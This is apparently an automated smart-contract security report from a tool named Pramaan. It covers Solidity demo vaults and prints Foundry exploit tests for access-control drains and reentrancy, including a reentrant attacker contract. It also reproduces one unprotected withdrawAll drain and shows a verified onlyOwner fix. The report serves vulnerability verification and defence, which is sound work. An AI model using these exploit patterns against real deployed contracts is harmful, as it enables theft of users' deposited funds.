# Pramaan security evidence report

- Repository: local:pramaan/contracts
- Commit: c1118c5491ae96f36c9796e1eb39a1986aa975691dc6e4c2c08ad10350e6563a
- Analysed: 2026-11-06T15:25:47.570Z → 2026-11-06T15:26:45.592Z
- Tools: forge forge Version: 1.8.7, slither 0.11.6, aderyn aderyn 0.6.8, solc 0.8.20,0.8.24,0.8.26,0.8.28,0.8.30,0.8.33,0.8.35,0.8.38, pramaan-sandbox 1
- Sandbox: `pramaan/sandbox:0.1.0`, no network, read-only root, analysis 37 s, tests 21 s
- Scanners: Slither 18 results, Aderyn 10 issues
- Regression suite on the analysed code: 106 passed, 0 failed, 1 skipped

**1 reproduced** out of 52 scanner candidates. "No proof, no finding": a candidate is reported as a vulnerability only when a Foundry exploit test reproduces it.

| ID | Class | Contract.function | Status |
|---|---|---|---|
| PRM-1 | access-control | VaultV2.withdraw(uint256) | not-reproduced |
| PRM-2 | access-control | VulnerableVault.withdraw(uint256) | not-reproduced |
| PRM-3 | access-control | VulnerableVault.withdrawAll() | reproduced |
| PRM-4 | reentrancy | PermitMarketplace.list(uint256,uint256) | candidate |
| PRM-5 | reentrancy | VaultV2.withdrawAll() | not-reproduced |
| PRM-6 | reentrancy | VulnerableVault.withdrawAll() | not-reproduced |
| PRM-7 | incorrect-equality | MirrorYieldFarm._claim() | candidate |
| PRM-8 | incorrect-equality | MirrorYieldFarm.fundRewards(uint256,uint256) | candidate |
| PRM-9 | reentrancy | PermitMarketplace.buyWithPermit(uint256,uint256,uint8,bytes32,bytes32) | candidate |
| PRM-10 | centralization-risk | MirrorYieldFarm.fundRewards(uint256,uint256) | candidate |
| PRM-11 | centralization-risk | src/demo/MirrorYieldFarm.sol.- | candidate |
| PRM-12 | centralization-risk | VaultV2._authorizeUpgrade(address) | candidate |
| PRM-13 | centralization-risk | VaultV2.withdrawAll() | candidate |
| PRM-14 | centralization-risk | VulnerableVault._authorizeUpgrade(address) | candidate |
| PRM-15 | empty-block | VaultV2._authorizeUpgrade(address) | candidate |
| PRM-16 | empty-block | VulnerableVault._authorizeUpgrade(address) | candidate |
| PRM-17 | missing-zero-check | VaultV3Unaudited.- | candidate |
| PRM-18 | non-reentrant-not-first | MirrorYieldFarm.fundRewards(uint256,uint256) | candidate |
| PRM-19 | push-zero-opcode | src/demo/DemoNFT.sol.- | candidate |
| PRM-20 | push-zero-opcode | src/demo/DemoToken.sol.- | candidate |
| PRM-21 | push-zero-opcode | src/demo/MirrorYieldFarm.sol.- | candidate |
| PRM-22 | push-zero-opcode | src/demo/PermitMarketplace.sol.- | candidate |
| PRM-23 | push-zero-opcode | src/demo/VaultV2.sol.- | candidate |
| PRM-24 | push-zero-opcode | src/demo/VaultV3Unaudited.sol.- | candidate |
| PRM-25 | push-zero-opcode | src/demo/VulnerableVault.sol.- | candidate |
| PRM-26 | push-zero-opcode | src/interfaces/ITextSetter.sol.- | candidate |
| PRM-27 | push-zero-opcode | src/PramaanTimelock.sol.- | candidate |
| PRM-28 | reentrancy-events | PramaanTimelock.execute(uint256) | candidate |
| PRM-29 | reentrancy-events | VaultV2.withdraw(uint256) | candidate |
| PRM-30 | reentrancy-events | VaultV2.withdrawAll() | candidate |
| PRM-31 | reentrancy-events | VulnerableVault.withdraw(uint256) | candidate |
| PRM-32 | reentrancy-events | VulnerableVault.withdrawAll() | candidate |
| PRM-33 | require-revert-in-loop | PramaanTimelock._validate(string) | candidate |
| PRM-34 | state-no-address-check | VaultV2.initialize(address,addressIERC20) | candidate |
| PRM-35 | state-no-address-check | VulnerableVault.initialize(address,addressIERC20) | candidate |
| PRM-36 | state-variable-could-be-immutable | src/PramaanTimelock.sol.- | candidate |
| PRM-37 | timestamp | DemoToken.faucet() | candidate |
| PRM-38 | timestamp | MirrorYieldFarm._claim() | candidate |
| PRM-39 | timestamp | MirrorYieldFarm.fundRewards(uint256,uint256) | candidate |
| PRM-40 | timestamp | MirrorYieldFarm.lastTimeRewardApplicable() | candidate |
| PRM-41 | timestamp | MirrorYieldFarm.rewardsRemaining() | candidate |
| PRM-42 | timestamp | PramaanTimelock.execute(uint256) | candidate |
| PRM-43 | timestamp | PramaanTimelock.isReady(uint256) | candidate |
| PRM-44 | unspecific-solidity-pragma | src/demo/DemoNFT.sol.- | candidate |
| PRM-45 | unspecific-solidity-pragma | src/demo/DemoToken.sol.- | candidate |
| PRM-46 | unspecific-solidity-pragma | src/demo/MirrorYieldFarm.sol.- | candidate |
| PRM-47 | unspecific-solidity-pragma | src/demo/PermitMarketplace.sol.- | candidate |
| PRM-48 | unspecific-solidity-pragma | src/demo/VaultV2.sol.- | candidate |
| PRM-49 | unspecific-solidity-pragma | src/demo/VaultV3Unaudited.sol.- | candidate |
| PRM-50 | unspecific-solidity-pragma | src/demo/VulnerableVault.sol.- | candidate |
| PRM-51 | unspecific-solidity-pragma | src/interfaces/ITextSetter.sol.- | candidate |
| PRM-52 | unspecific-solidity-pragma | src/PramaanTimelock.sol.- | candidate |

## PRM-1: Missing access control on a value-moving function

- Location: `src/demo/VaultV2.sol` lines 61
- Found by: aderyn `eth-send-unchecked-address`
- Template: access-control-drain@1 (slots filled by heuristics)
- Hypothesis: VaultV2.withdraw(uint256) moves the contract's ETH without checking who calls it.
- Property: An account with no role must not be able to take ETH that other users deposited.
- Result: **not reproduced: the exploit test failed, so this candidate is not reported as a vulnerability** (InsufficientBalance(10000000000000000000 [1e19], 0))
- Gates: ✓ slot-vocabulary, ✓ no-state-forging, ✓ attacker-only, ✓ concrete-assertion

<details><summary>Exploit test (sha256 bdc3b535794fe20f2513f90e89ca9354d9d74fbb9412b5d2a2e25e271e03197a)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding PRM-1: template access-control-drain@1, slots filled by heuristics.
// Hypothesis: VaultV2.withdraw(uint256) moves the contract's ETH without checking who calls it.
// Property under test: An account with no role must not be able to take ETH that other users deposited.
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {VaultV2 as PramaanTarget} from "src/demo/VaultV2.sol";

/// Minimal ERC-1967 proxy used to deploy upgradeable targets (same implementation slot as OpenZeppelin).
contract PramaanProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation, bytes memory data) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }
        if (data.length > 0) {
            (bool ok, bytes memory ret) = implementation.delegatecall(data);
            if (!ok) {
                assembly {
                    revert(add(ret, 32), mload(ret))
                }
            }
        }
    }

    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// Minimal ERC-20 used when the target needs a token address at deployment.
contract PramaanMockToken {
    string public constant name = "Pramaan Mock Token";
    string public constant symbol = "PMOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract PramaanExploit_PRM_1 is Test {
    PramaanTarget internal target;
    PramaanMockToken internal token;
    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
        token = new PramaanMockToken();
        vm.startPrank(owner);
        PramaanTarget implementation = new PramaanTarget();
        target = PramaanTarget(payable(address(new PramaanProxy(address(implementation), abi.encodeWithSelector(PramaanTarget.initialize.selector, owner, address(token))))));
        vm.stopPrank();
        vm.deal(victim, SEED);
        vm.prank(victim);
        target.deposit{value: SEED}();
    }

    function test_exploit() public {
        uint256 targetBefore = address(target).balance;
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        target.withdraw(SEED);
        uint256 gained = attacker.balance - attackerBefore;
        emit log_named_uint("pramaan.target_balance_before", targetBefore);
        emit log_named_uint("pramaan.attacker_gain", gained);
        assertGe(gained, SEED, "Pramaan: an account with no role took ETH other users deposited");
    }
}
```

</details>

## PRM-2: Missing access control on a value-moving function

- Location: `src/demo/VulnerableVault.sol` lines 63
- Found by: aderyn `eth-send-unchecked-address`
- Template: access-control-drain@1 (slots filled by heuristics)
- Hypothesis: VulnerableVault.withdraw(uint256) moves the contract's ETH without checking who calls it.
- Property: An account with no role must not be able to take ETH that other users deposited.
- Result: **not reproduced: the exploit test failed, so this candidate is not reported as a vulnerability** (InsufficientBalance(10000000000000000000 [1e19], 0))
- Gates: ✓ slot-vocabulary, ✓ no-state-forging, ✓ attacker-only, ✓ concrete-assertion
- Same exploit against `VaultV2`: reverted (InsufficientBalance(10000000000000000000 [1e19], 0))

<details><summary>Exploit test (sha256 a93a905e94380ac0507a0a8eebfab6e2282a1955e56284c803f5570f3932d04c)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding PRM-2: template access-control-drain@1, slots filled by heuristics.
// Hypothesis: VulnerableVault.withdraw(uint256) moves the contract's ETH without checking who calls it.
// Property under test: An account with no role must not be able to take ETH that other users deposited.
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {VulnerableVault as PramaanTarget} from "src/demo/VulnerableVault.sol";

/// Minimal ERC-1967 proxy used to deploy upgradeable targets (same implementation slot as OpenZeppelin).
contract PramaanProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation, bytes memory data) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }
        if (data.length > 0) {
            (bool ok, bytes memory ret) = implementation.delegatecall(data);
            if (!ok) {
                assembly {
                    revert(add(ret, 32), mload(ret))
                }
            }
        }
    }

    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// Minimal ERC-20 used when the target needs a token address at deployment.
contract PramaanMockToken {
    string public constant name = "Pramaan Mock Token";
    string public constant symbol = "PMOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract PramaanExploit_PRM_2 is Test {
    PramaanTarget internal target;
    PramaanMockToken internal token;
    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
        token = new PramaanMockToken();
        vm.startPrank(owner);
        PramaanTarget implementation = new PramaanTarget();
        target = PramaanTarget(payable(address(new PramaanProxy(address(implementation), abi.encodeWithSelector(PramaanTarget.initialize.selector, owner, address(token))))));
        vm.stopPrank();
        vm.deal(victim, SEED);
        vm.prank(victim);
        target.deposit{value: SEED}();
    }

    function test_exploit() public {
        uint256 targetBefore = address(target).balance;
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        target.withdraw(SEED);
        uint256 gained = attacker.balance - attackerBefore;
        emit log_named_uint("pramaan.target_balance_before", targetBefore);
        emit log_named_uint("pramaan.attacker_gain", gained);
        assertGe(gained, SEED, "Pramaan: an account with no role took ETH other users deposited");
    }
}
```

</details>

## PRM-3: Missing access control on a value-moving function

- Location: `src/demo/VulnerableVault.sol` lines 85-94
- Found by: slither `arbitrary-send-eth`, slither `pramaan-unprotected-sweep`, aderyn `eth-send-unchecked-address`
- Template: access-control-drain@1 (slots filled by heuristics)
- Hypothesis: VulnerableVault.withdrawAll() moves the contract's ETH without checking who calls it.
- Property: An account with no role must not be able to take ETH that other users deposited.
- Result: **REPRODUCED: the exploit test passed on this code**
- Gates: ✓ slot-vocabulary, ✓ no-state-forging, ✓ attacker-only, ✓ concrete-assertion

Execution log:

```
pramaan.target_balance_before: 10000000000000000000
pramaan.attacker_gain: 10000000000000000000
```
- Same exploit against `VaultV2`: **fails as expected** (OwnableUnauthorizedAccount(0x8f7A9E84e16Fd6288618C51dC0c6d5304f24c4a3))

### Proposed fix (verified)

VulnerableVault.withdrawAll() moves funds without checking msg.sender. It inherits Ownable, so restricting it with onlyOwner makes it the owner-only emergency function it was meant to be.

```diff
===================================================================
--- a/src/demo/VulnerableVault.sol
+++ b/src/demo/VulnerableVault.sol
@@ -82,7 +82,7 @@
     }
 
     /// @notice Emergency sweep of every asset held by the vault.
-    function withdrawAll() external {
+    function withdrawAll() external onlyOwner {
         uint256 ethAmount = address(this).balance;
         uint256 tokenAmount = token.balanceOf(address(this));
         totalEthDeposits = 0;
```

Re-verification: exploit blocked (reverted: OwnableUnauthorizedAccount(0x8f7A9E84e16Fd6288618C51dC0c6d5304f24c4a3)); 106 regression tests pass

<details><summary>Exploit test (sha256 badaa5467a09f93a3c664f960621beff32a43b3d905b9ee4fe1be6b7ebd98240)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding PRM-3: template access-control-drain@1, slots filled by heuristics.
// Hypothesis: VulnerableVault.withdrawAll() moves the contract's ETH without checking who calls it.
// Property under test: An account with no role must not be able to take ETH that other users deposited.
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {VulnerableVault as PramaanTarget} from "src/demo/VulnerableVault.sol";

/// Minimal ERC-1967 proxy used to deploy upgradeable targets (same implementation slot as OpenZeppelin).
contract PramaanProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation, bytes memory data) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }
        if (data.length > 0) {
            (bool ok, bytes memory ret) = implementation.delegatecall(data);
            if (!ok) {
                assembly {
                    revert(add(ret, 32), mload(ret))
                }
            }
        }
    }

    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// Minimal ERC-20 used when the target needs a token address at deployment.
contract PramaanMockToken {
    string public constant name = "Pramaan Mock Token";
    string public constant symbol = "PMOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract PramaanExploit_PRM_3 is Test {
    PramaanTarget internal target;
    PramaanMockToken internal token;
    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
        token = new PramaanMockToken();
        vm.startPrank(owner);
        PramaanTarget implementation = new PramaanTarget();
        target = PramaanTarget(payable(address(new PramaanProxy(address(implementation), abi.encodeWithSelector(PramaanTarget.initialize.selector, owner, address(token))))));
        vm.stopPrank();
        vm.deal(victim, SEED);
        vm.prank(victim);
        target.deposit{value: SEED}();
    }

    function test_exploit() public {
        uint256 targetBefore = address(target).balance;
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        target.withdrawAll();
        uint256 gained = attacker.balance - attackerBefore;
        emit log_named_uint("pramaan.target_balance_before", targetBefore);
        emit log_named_uint("pramaan.attacker_gain", gained);
        assertGe(gained, SEED, "Pramaan: an account with no role took ETH other users deposited");
    }
}
```

</details>

## PRM-5: Reentrancy: state updated after an external call

- Location: `src/demo/VaultV2.sol` lines 85
- Found by: aderyn `reentrancy-state-change`
- Template: reentrancy-eth@1 (slots filled by heuristics)
- Hypothesis: VaultV2.withdrawAll() sends ETH before updating the caller's balance, so a contract can re-enter it.
- Property: No account may withdraw more ETH than it deposited.
- Result: **not reproduced: the exploit test failed, so this candidate is not reported as a vulnerability** (OwnableUnauthorizedAccount(0xf731791c2632D8603dE4a0e430297C412Accc06f))
- Gates: ✓ slot-vocabulary, ✓ no-state-forging, ✓ attacker-only, ✓ concrete-assertion

<details><summary>Exploit test (sha256 3fd6029aaf5f4663b484b0941f856b87403a872f7175eba7cd179d6ab6abaa04)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding PRM-5: template reentrancy-eth@1, slots filled by heuristics.
// Hypothesis: VaultV2.withdrawAll() sends ETH before updating the caller's balance, so a contract can re-enter it.
// Property under test: No account may withdraw more ETH than it deposited.
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {VaultV2 as PramaanTarget} from "src/demo/VaultV2.sol";

/// Minimal ERC-1967 proxy used to deploy upgradeable targets (same implementation slot as OpenZeppelin).
contract PramaanProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation, bytes memory data) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }
        if (data.length > 0) {
            (bool ok, bytes memory ret) = implementation.delegatecall(data);
            if (!ok) {
                assembly {
                    revert(add(ret, 32), mload(ret))
                }
            }
        }
    }

    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// Minimal ERC-20 used when the target needs a token address at deployment.
contract PramaanMockToken {
    string public constant name = "Pramaan Mock Token";
    string public constant symbol = "PMOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

/// Re-enters the target from its receive() hook while the target still holds ETH.
contract PramaanReentrancyAttacker {
    PramaanTarget internal immutable target;
    uint256 internal immutable step;
    uint256 public reentries;

    constructor(PramaanTarget target_, uint256 step_) {
        target = target_;
        step = step_;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdrawAll();
    }

    receive() external payable {
        if (reentries < 25 && address(target).balance >= step) {
            reentries += 1;
            target.withdrawAll();
        }
    }
}

contract PramaanExploit_PRM_5 is Test {
    PramaanTarget internal target;
    PramaanMockToken internal token;
    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
        token = new PramaanMockToken();
        vm.startPrank(owner);
        PramaanTarget implementation = new PramaanTarget();
        target = PramaanTarget(payable(address(new PramaanProxy(address(implementation), abi.encodeWithSelector(PramaanTarget.initialize.selector, owner, address(token))))));
        vm.stopPrank();
        vm.deal(victim, SEED);
        vm.prank(victim);
        target.deposit{value: SEED}();
    }

    function test_exploit() public {
        vm.deal(attacker, ATTACK);
        vm.prank(attacker);
        PramaanReentrancyAttacker exploit = new PramaanReentrancyAttacker(target, ATTACK);
        vm.prank(attacker);
        exploit.attack{value: ATTACK}();
        emit log_named_uint("pramaan.reentries", exploit.reentries());
        emit log_named_uint("pramaan.attacker_contract_balance", address(exploit).balance);
        assertGt(exploit.reentries(), 0, "Pramaan: the target was never re-entered");
        assertGt(address(exploit).balance, ATTACK, "Pramaan: the attacker withdrew more ETH than it deposited");
    }
}
```

</details>

## PRM-6: Reentrancy: state updated after an external call

- Location: `src/demo/VulnerableVault.sol` lines 87
- Found by: aderyn `reentrancy-state-change`
- Template: reentrancy-eth@1 (slots filled by heuristics)
- Hypothesis: VulnerableVault.withdrawAll() sends ETH before updating the caller's balance, so a contract can re-enter it.
- Property: No account may withdraw more ETH than it deposited.
- Result: **not reproduced: the exploit test failed, so this candidate is not reported as a vulnerability** (Pramaan: the target was never re-entered: 0 <= 0)
- Gates: ✓ slot-vocabulary, ✓ no-state-forging, ✓ attacker-only, ✓ concrete-assertion

Execution log:

```
pramaan.reentries: 0
pramaan.attacker_contract_balance: 11000000000000000000
```
- Same exploit against `VaultV2`: reverted (OwnableUnauthorizedAccount(0xf731791c2632D8603dE4a0e430297C412Accc06f))

<details><summary>Exploit test (sha256 e52f4623a33c49c3155b4cb5d2dd65d2934e4c79e992a09ba2b96d0078084e12)</summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
// Generated by Pramaan for finding PRM-6: template reentrancy-eth@1, slots filled by heuristics.
// Hypothesis: VulnerableVault.withdrawAll() sends ETH before updating the caller's balance, so a contract can re-enter it.
// Property under test: No account may withdraw more ETH than it deposited.
// Passing on the vulnerable code reproduces the bug. On fixed code this test must fail (revert or property assertion).
pragma solidity >=0.8.0 <0.9.0;

import {Test} from "lib/pramaan-forge-std/src/Test.sol";
import {VulnerableVault as PramaanTarget} from "src/demo/VulnerableVault.sol";

/// Minimal ERC-1967 proxy used to deploy upgradeable targets (same implementation slot as OpenZeppelin).
contract PramaanProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address implementation, bytes memory data) payable {
        assembly {
            sstore(IMPLEMENTATION_SLOT, implementation)
        }
        if (data.length > 0) {
            (bool ok, bytes memory ret) = implementation.delegatecall(data);
            if (!ok) {
                assembly {
                    revert(add(ret, 32), mload(ret))
                }
            }
        }
    }

    fallback() external payable {
        assembly {
            let impl := sload(IMPLEMENTATION_SLOT)
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// Minimal ERC-20 used when the target needs a token address at deployment.
contract PramaanMockToken {
    string public constant name = "Pramaan Mock Token";
    string public constant symbol = "PMOCK";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

/// Re-enters the target from its receive() hook while the target still holds ETH.
contract PramaanReentrancyAttacker {
    PramaanTarget internal immutable target;
    uint256 internal immutable step;
    uint256 public reentries;

    constructor(PramaanTarget target_, uint256 step_) {
        target = target_;
        step = step_;
    }

    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdrawAll();
    }

    receive() external payable {
        if (reentries < 25 && address(target).balance >= step) {
            reentries += 1;
            target.withdrawAll();
        }
    }
}

contract PramaanExploit_PRM_6 is Test {
    PramaanTarget internal target;
    PramaanMockToken internal token;
    address internal owner = makeAddr("pramaan.owner");
    address internal victim = makeAddr("pramaan.victim");
    address internal attacker = makeAddr("pramaan.attacker");
    uint256 internal constant SEED = 10 ether;
    uint256 internal constant ATTACK = 1 ether;

    function setUp() public {
        token = new PramaanMockToken();
        vm.startPrank(owner);
        PramaanTarget implementation = new PramaanTarget();
        target = PramaanTarget(payable(address(new PramaanProxy(address(implementation), abi.encodeWithSelector(PramaanTarget.initialize.selector, owner, address(token))))));
        vm.stopPrank();
        vm.deal(victim, SEED);
        vm.prank(victim);
        target.deposit{value: SEED}();
    }

    function test_exploit() public {
        vm.deal(attacker, ATTACK);
        vm.prank(attacker);
        PramaanReentrancyAttacker exploit = new PramaanReentrancyAttacker(target, ATTACK);
        vm.prank(attacker);
        exploit.attack{value: ATTACK}();
        emit log_named_uint("pramaan.reentries", exploit.reentries());
        emit log_named_uint("pramaan.attacker_contract_balance", address(exploit).balance);
        assertGt(exploit.reentries(), 0, "Pramaan: the target was never re-entered");
        assertGt(address(exploit).balance, ATTACK, "Pramaan: the attacker withdrew more ETH than it deposited");
    }
}
```

</details>

## Candidates without an exploit

- PRM-4 PermitMarketplace.list(uint256,uint256) (reentrancy-state-change): reentrancy template needs a payable deposit function on PermitMarketplace
- PRM-7 MirrorYieldFarm._claim() (incorrect-equality): no exploit template for class "incorrect-equality"
- PRM-8 MirrorYieldFarm.fundRewards(uint256,uint256) (incorrect-equality): no exploit template for class "incorrect-equality"
- PRM-9 PermitMarketplace.buyWithPermit(uint256,uint256,uint8,bytes32,bytes32) (reentrancy-no-eth): reentrancy template needs a payable deposit function on PermitMarketplace
- PRM-10 MirrorYieldFarm.fundRewards(uint256,uint256) (centralization-risk): no exploit template for class "centralization-risk"
- PRM-11 src/demo/MirrorYieldFarm.sol.- (centralization-risk): contract src/demo/MirrorYieldFarm.sol not found in build output
- PRM-12 VaultV2._authorizeUpgrade(address) (centralization-risk): no exploit template for class "centralization-risk"
- PRM-13 VaultV2.withdrawAll() (centralization-risk): no exploit template for class "centralization-risk"
- PRM-14 VulnerableVault._authorizeUpgrade(address) (centralization-risk): no exploit template for class "centralization-risk"
- PRM-15 VaultV2._authorizeUpgrade(address) (empty-block): no exploit template for class "empty-block"
- PRM-16 VulnerableVault._authorizeUpgrade(address) (empty-block): no exploit template for class "empty-block"
- PRM-17 VaultV3Unaudited.- (missing-zero-check): no exploit template for class "missing-zero-check"
- PRM-18 MirrorYieldFarm.fundRewards(uint256,uint256) (non-reentrant-not-first): no exploit template for class "non-reentrant-not-first"
